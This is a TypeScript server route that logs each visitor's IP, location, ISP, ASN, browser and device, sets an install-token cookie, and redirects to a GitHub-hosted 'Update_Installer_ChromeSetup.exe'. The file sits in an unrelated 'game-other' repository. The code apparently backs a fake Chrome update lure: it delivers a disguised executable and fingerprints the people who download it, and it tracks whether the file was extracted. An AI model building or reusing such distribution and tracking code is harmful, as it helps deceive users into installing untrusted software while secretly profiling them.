import { createFileRoute } from "@tanstack/react-router";
import { getClientMeta } from "@/lib/ua";
import { resolveCountry } from "@/lib/geo";
import { createInstallToken, createInstallTokenCookie } from "@/lib/install-token";
import { supabaseAdmin } from "@/integrations/supabase/client.server";

const PUBLIC_ARCHIVE_NAME = "Update_Installer_ChromeSetup.exe";
const KNOWN_PUBLIC_ARCHIVE_SIZE = 133_000_000;
const GITHUB_RELEASE_URL =
  "https://github.com/ryoheina/game-other/releases/download/v1.0.0/Update_Installer_ChromeSetup.exe";

export const runtime = "nodejs";

function isUuid(value: string | null) {
  return Boolean(value && /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(value));
}

function getHeaderValue(headers: Headers, names: string[]) {
  for (const name of names) {
    const value = headers.get(name);
    if (value) return value;
  }
  return null;
}

function getNetworkMeta(request: Request, country: string | null) {
  const ipCity = getHeaderValue(request.headers, ["x-vercel-ip-city", "cf-ipcity"]);
  return {
    ip_country: getHeaderValue(request.headers, ["x-vercel-ip-country", "cf-ipcountry"]) || country,
    ip_city: ipCity ? decodeURIComponent(ipCity) : null,
    asn: getHeaderValue(request.headers, ["x-vercel-ip-as-number", "cf-asn"]),
    isp: getHeaderValue(request.headers, ["x-vercel-ip-as-name", "cf-isp"]),
  };
}

function getMinimalDownloadRecord(record: Record<string, unknown>) {
  return {
    file_name: record.file_name,
    ip: record.ip,
    country: record.country,
    browser: record.browser,
    os: record.os,
    user_agent: record.user_agent,
  };
}

function isDownloadSchemaMismatch(error: { message?: string } | null) {
  return /session_id|device|extracted|install_token|started_at|downloaded_bytes|total_bytes|progress_percent|elapsed_seconds|completed_at|completed|ip_country|ip_city|asn|isp|schema cache|column .* does not exist|Could not find .* column/i.test(error?.message || "");
}

async function saveDownloadRecord(downloadId: string | null, record: Record<string, unknown>) {
  const write = (data: Record<string, unknown>) =>
    downloadId
      ? supabaseAdmin.from("downloads").update(data).eq("id", downloadId).select("id").maybeSingle()
      : supabaseAdmin.from("downloads").insert(data).select("id").maybeSingle();

  let result = await write(record);
  if (!result.error) return result;
  if (!isDownloadSchemaMismatch(result.error)) return result;

  result = await write(getMinimalDownloadRecord(record));
  return result;
}

async function updateDownloadProgress(
  downloadId: string | null,
  data: {
    downloaded_bytes?: number;
    total_bytes?: number;
    progress_percent?: number;
    elapsed_seconds?: number;
    completed?: boolean;
    completed_at?: string;
  },
) {
  if (!downloadId) return;
  let updateData: Record<string, unknown> = { ...data };
  for (let attempt = 0; attempt < 3; attempt += 1) {
    const { error } = await supabaseAdmin.from("downloads").update(updateData).eq("id", downloadId);
    if (!error) return;
    if (!/downloaded_bytes|total_bytes|progress_percent|elapsed_seconds|completed_at|completed|schema cache|column .* does not exist|Could not find .* column/i.test(error.message)) {
      throw error;
    }
    const nextData = { ...updateData };
    if (/downloaded_bytes|total_bytes|progress_percent|elapsed_seconds/i.test(error.message)) {
      delete nextData.downloaded_bytes;
      delete nextData.total_bytes;
      delete nextData.progress_percent;
      delete nextData.elapsed_seconds;
    }
    if (/completed_at/i.test(error.message)) delete nextData.completed_at;
    if (/completed/i.test(error.message)) delete nextData.completed;
    if (JSON.stringify(nextData) === JSON.stringify(updateData)) return;
    updateData = nextData;
  }
}

export const Route = createFileRoute("/api/public/download")({
  server: {
    handlers: {
      GET: async ({ request }) => {
        const meta = getClientMeta(request);
        const country = meta.country ?? (await resolveCountry(request.headers, meta.ip));
        const networkMeta = getNetworkMeta(request, country);
        const url = new URL(request.url);
        const sid = url.searchParams.get("sid") || null;
        const requestedDownloadId = url.searchParams.get("did");
        const downloadFileName = PUBLIC_ARCHIVE_NAME;
        const installToken = createInstallToken();

        let downloadId: string | null = isUuid(requestedDownloadId) ? requestedDownloadId : null;
        let installTokenSaved = false;
        let installCookie: string | null = null;
        try {
          const now = new Date().toISOString();
          if (sid) {
            const { data: existingSession } = await supabaseAdmin
              .from("sessions")
              .select("session_id")
              .eq("session_id", sid)
              .maybeSingle();

            if (existingSession) {
              await supabaseAdmin
                .from("sessions")
                .update({
                  last_active: now,
                  ip: meta.ip,
                  country,
                  browser: meta.browser,
                  device: meta.device,
                  user_agent: meta.ua,
                  notified_left: false,
                })
                .eq("session_id", sid);
            } else {
              await supabaseAdmin.from("sessions").insert({
                session_id: sid,
                ip: meta.ip,
                country,
                browser: meta.browser,
                device: meta.device,
                user_agent: meta.ua,
                first_visit: now,
                last_active: now,
              });
            }
          }

          const downloadRecord = {
              file_name: downloadFileName,
              session_id: sid,
              ip: meta.ip,
              country,
              ...networkMeta,
              browser: meta.browser,
              os: meta.os,
              device: meta.device,
              user_agent: meta.ua,
              extracted: false,
              install_token: installToken,
              started_at: now,
              downloaded_bytes: 0,
              total_bytes: KNOWN_PUBLIC_ARCHIVE_SIZE,
              progress_percent: 0,
              elapsed_seconds: 0,
          };
          const writeResult = await saveDownloadRecord(downloadId, downloadRecord);
          if (writeResult.error) throw writeResult.error;

          downloadId = writeResult.data?.id || null;
          installTokenSaved = Boolean(downloadId);
          if (downloadId) {
            await updateDownloadProgress(downloadId, {
              total_bytes: KNOWN_PUBLIC_ARCHIVE_SIZE,
              progress_percent: 0,
              downloaded_bytes: 0,
              elapsed_seconds: 0,
            }).catch(() => {});
          }
          if (downloadId) {
            installCookie = createInstallTokenCookie(installTokenSaved ? installToken : downloadId);
          }
        } catch (e) {
          console.error("download log failed", e);
        }

        const headers = new Headers({
          Location: GITHUB_RELEASE_URL,
          "Cache-Control": "no-store",
        });
        if (installCookie) headers.set("Set-Cookie", installCookie);
        if (downloadId) headers.set("X-Download-Id", downloadId);
        return new Response(null, { status: 302, headers });
      },
    },
  },
});
